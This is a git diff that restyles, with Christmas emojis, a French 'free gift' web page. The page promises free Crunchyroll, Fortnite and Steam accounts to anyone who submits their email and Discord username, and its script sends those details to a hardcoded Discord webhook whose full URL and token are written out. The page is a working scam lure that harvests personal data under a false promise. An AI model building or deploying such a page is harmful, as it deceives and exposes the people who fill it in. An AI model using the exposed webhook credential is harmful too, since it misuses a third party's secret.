@@ -3,39 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Offre de Noël</title>
+    <title>Offre de Noël 🎄🎁</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             margin: 0;
             padding: 0;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
             height: 100vh;
+            background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%); /* Dégradé de couleur de Noël */
+            color: #333;
         }
         .container {
-            background-color: #fff;
+            background-color: rgba(255, 255, 255, 0.9);
             padding: 20px;
             border-radius: 10px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             text-align: center;
+            max-width: 400px;
+            width: 100%;
+        }
+        h1 {
+            color: #d32f2f;
+            margin-bottom: 10px;
         }
         input[type="text"], input[type="email"], select {
             width: 100%;
             padding: 10px;
             margin: 10px 0;
             border: 1px solid #ccc;
-            border-radius: 5px;
+            border-radius: 25px;
         }
         button {
             padding: 10px 20px;
             background-color: #28a745;
             color: #fff;
             border: none;
-            border-radius: 5px;
+            border-radius: 25px;
             cursor: pointer;
+            transition: background-color 0.3s;
         }
         button:hover {
             background-color: #218838;
@@ -44,24 +53,24 @@
 </head>
 <body>
     <div class="container" id="formContainer">
-        <h1>Offre de Noël</h1>
-        <p>Obtenez un produit gratuit en échange de votre email et pseudo Discord !</p>
+        <h1>Offre de Noël 🎄🎁</h1>
+        <p>🎅 Obtenez un produit gratuit en échange de votre email et pseudo Discord ! 🎅</p>
         <form id="offerForm">
             <select id="product" required>
-                <option value="" disabled selected>Choisissez un produit</option>
+                <option value="" disabled selected>🎁 Choisissez un produit 🎁</option>
                 <option value="Produit 1">Crunchyroll Account</option>
                 <option value="Produit 2">FN Account</option>
                 <option value="Produit 3">Steam Account</option>
             </select>
-            <input type="text" id="discordUsername" placeholder="Pseudo Discord" required>
-            <input type="email" id="email" placeholder="Email" required>
-            <button type="submit">Obtenir le produit gratuit</button>
+            <input type="text" id="discordUsername" placeholder="🎄 Pseudo Discord 🎄" required>
+            <input type="email" id="email" placeholder="🎄 Email 🎄" required>
+            <button type="submit">🎁 Obtenir le produit gratuit 🎁</button>
         </form>
     </div>
 
     <div class="container" id="confirmationContainer" style="display: none;">
-        <h1>Commande en cours</h1>
-        <p>Attendez environ 24h pour recevoir votre produit par email !</p>
+        <h1>Commande en cours 🎅</h1>
+        <p>🎁 Attendez environ 24h pour recevoir votre produit par email ! 🎁</p>
     </div>
 
     <script>
@@ -71,10 +80,10 @@
             const discordUsername = document.getElementById('discordUsername').value;
             const email = document.getElementById('email').value;
 
-            const webhookUrl = 'https://discordapp.com/api/webhooks/1321945888171753542/WfClK3T35-yKtzSEACLVKQvHZa_cqyAGL6GhY0-B0cLYizYrpBfGk36EZtYmQ_8itpYd';
+            const webhookUrl = 'https://discordapp.com/api/webhooks/1321945888171753542/WfClK3T35-yKtzSEACLVKQvHZa_cqyAGL6GhY0-B0cLYizYrpBfGk36EZtYmQ_8itpYd'; 
 
             const data = {
-                content: `Nouveau formulaire soumis !\nProduit: ${product}\nPseudo Discord: ${discordUsername}\nEmail: ${email}`
+                content: `Nouveau formulaire soumis !\n🎁 Produit: ${product}\n🎄 Pseudo Discord: ${discordUsername}\n🎅 Email: ${email}`
             };
 
             fetch(webhookUrl, {
